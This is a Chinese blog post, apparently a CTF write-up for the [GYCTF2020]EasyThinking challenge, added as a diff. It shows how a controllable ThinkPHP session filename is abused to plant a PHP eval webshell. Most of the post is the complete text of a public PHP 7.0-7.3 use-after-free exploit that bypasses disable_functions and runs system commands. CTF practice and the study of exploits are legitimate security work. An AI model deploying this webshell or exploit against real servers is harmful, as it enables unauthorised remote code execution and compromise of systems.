@@ -1,0 +1,240 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8" />
+    <title>[GYCTF2020]EasyThinking | why</title>
+    <meta name="author" content="why" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/avatar.jpg" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>WHY</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;WHY</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>[GYCTF2020]EasyThinking</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/6/20
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>一开始看到我还以为是二次注入呢</p>
+<p>但是尝试之后发现不是</p>
+<p>所以看看wp</p>
+<p>发现是thinkphp框架</p>
+<p>所以先看看是哪个版本</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406201922989.png" alt="image-20240620192237924"></p>
+<p><strong>session可控，修改session，长度为32位，session后缀改为.php（加上.php后为32位）<br>然后再search搜索的内容会直接保存在&#x2F;runtime&#x2F;session&#x2F;目录下</strong></p>
+<p>所以我们注册账号，并在登陆时将session改为32位的php文件</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406201947562.png" alt="image-20240620194714529"></p>
+<p>登录之后将在搜索中搜索</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[why]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>一句话木马上传完毕，这个木马会保存在session文件中</p>
+<p>路径为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">runtime/session/sess_1234567812345678123456781234.php</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑连接</p>
+<p>成功之后我们发现无法读取flag，这里要绕过disable_functions</p>
+<p>上传exp</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span><br><span class="line">#</span><br><span class="line"># Bug: https://bugs.php.net/bug.php?id=72530</span><br><span class="line">#</span><br><span class="line"># This exploit should work on all PHP 7.0-7.3 versions</span><br><span class="line">#</span><br><span class="line"># Author: https://github.com/mm0r1</span><br><span class="line"></span><br><span class="line">pwn(&quot;/readflag&quot;);</span><br><span class="line"></span><br><span class="line">function pwn($cmd) &#123;</span><br><span class="line">    global $abc, $helper;</span><br><span class="line"></span><br><span class="line">    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;</span><br><span class="line">        $address = 0;</span><br><span class="line">        for($j = $s-1; $j &gt;= 0; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= 8;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        return $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function ptr2str($ptr, $m = 8) &#123;</span><br><span class="line">        $out = &quot;&quot;;</span><br><span class="line">        for ($i=0; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; 0xff);</span><br><span class="line">            $ptr &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">        return $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function write(&amp;$str, $p, $v, $n = 8) &#123;</span><br><span class="line">        $i = 0;</span><br><span class="line">        for($i = 0; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = chr($v &amp; 0xff);</span><br><span class="line">            $v &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function leak($addr, $p = 0, $s = 8) &#123;</span><br><span class="line">        global $abc, $helper;</span><br><span class="line">        write($abc, 0x68, $addr + $p - 0x10);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;</span><br><span class="line">        return $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function parse_elf($base) &#123;</span><br><span class="line">        $e_type = leak($base, 0x10, 2);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, 0x20);</span><br><span class="line">        $e_phentsize = leak($base, 0x36, 2);</span><br><span class="line">        $e_phnum = leak($base, 0x38, 2);</span><br><span class="line"></span><br><span class="line">        for($i = 0; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, 0, 4);</span><br><span class="line">            $p_flags = leak($header, 4, 4);</span><br><span class="line">            $p_vaddr = leak($header, 0x10);</span><br><span class="line">            $p_memsz = leak($header, 0x28);</span><br><span class="line"></span><br><span class="line">            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; # PT_LOAD, PF_Read_Write</span><br><span class="line">                # handle pie</span><br><span class="line">                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; # PT_LOAD, PF_Read_exec</span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            return false;</span><br><span class="line"></span><br><span class="line">        return [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_basic_funcs($base, $elf) &#123;</span><br><span class="line">        list($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                # &#x27;constant&#x27; constant check</span><br><span class="line">                if($deref != 0x746e6174736e6f63)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + 4) * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                # &#x27;bin2hex&#x27; constant check</span><br><span class="line">                if($deref != 0x786568326e6962)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"></span><br><span class="line">            return $data_addr + $i * 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_binary_base($binary_leak) &#123;</span><br><span class="line">        $base = 0;</span><br><span class="line">        $start = $binary_leak &amp; 0xfffffffffffff000;</span><br><span class="line">        for($i = 0; $i &lt; 0x1000; $i++) &#123;</span><br><span class="line">            $addr = $start - 0x1000 * $i;</span><br><span class="line">            $leak = leak($addr, 0, 7);</span><br><span class="line">            if($leak == 0x10102464c457f) &#123; # ELF header</span><br><span class="line">                return $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function get_system($basic_funcs) &#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        do &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, 0, 6);</span><br><span class="line"></span><br><span class="line">            if($f_name == 0x6d6574737973) &#123; # system</span><br><span class="line">                return leak($addr + 8);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += 0x20;</span><br><span class="line">        &#125; while($f_entry != 0);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class ryat &#123;</span><br><span class="line">        var $ryat;</span><br><span class="line">        var $chtg;</span><br><span class="line"></span><br><span class="line">        function __destruct()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;chtg = $this-&gt;ryat;</span><br><span class="line">            $this-&gt;ryat = 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class Helper &#123;</span><br><span class="line">        public $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123;</span><br><span class="line">        die(&#x27;This PoC is for *nix systems only.&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = 10; # increase this value if you get segfaults</span><br><span class="line"></span><br><span class="line">    $contiguous = [];</span><br><span class="line">    for($i = 0; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_repeat(&#x27;A&#x27;, 79);</span><br><span class="line"></span><br><span class="line">    $poc = &#x27;a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:&quot;ryat&quot;:2:&#123;s:4:&quot;ryat&quot;;R:3;s:4:&quot;chtg&quot;;i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;&#x27;;</span><br><span class="line">    $out = unserialize($poc);</span><br><span class="line">    gc_collect_cycles();</span><br><span class="line"></span><br><span class="line">    $v = [];</span><br><span class="line">    $v[0] = ptr2str(0, 79);</span><br><span class="line">    unset($v);</span><br><span class="line">    $abc = $out[2][0];</span><br><span class="line"></span><br><span class="line">    $helper = new Helper;</span><br><span class="line">    $helper-&gt;b = function ($x) &#123; &#125;;</span><br><span class="line"></span><br><span class="line">    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;</span><br><span class="line">        die(&quot;UAF failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # leaks</span><br><span class="line">    $closure_handlers = str2ptr($abc, 0);</span><br><span class="line">    $php_heap = str2ptr($abc, 0x58);</span><br><span class="line">    $abc_addr = $php_heap - 0xc8;</span><br><span class="line"></span><br><span class="line">    # fake value</span><br><span class="line">    write($abc, 0x60, 2);</span><br><span class="line">    write($abc, 0x70, 6);</span><br><span class="line"></span><br><span class="line">    # fake reference</span><br><span class="line">    write($abc, 0x10, $abc_addr + 0x60);</span><br><span class="line">    write($abc, 0x18, 0xa);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, 0x20);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, 8);</span><br><span class="line">    if(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t determine binary base address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t parse ELF header&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get basic_functions address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get zif_system address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # fake closure object</span><br><span class="line">    $fake_obj_offset = 0xd0;</span><br><span class="line">    for($i = 0; $i &lt; 0x110; $i += 8) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # pwn</span><br><span class="line">    write($abc, 0x20, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, 0xd0 + 0x38, 1, 4); # internal func type</span><br><span class="line">    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler</span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line"></span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202004375.png" alt="image-20240620200423324"></p>
+<p>之后访问1.php</p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406202004946.png" alt="image-20240620200439923"></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 why
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;why
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+<script src="/js/<file>"></script>
+<link rel="stylesheet" href="/css/<file>" />
+</body>
+</html>
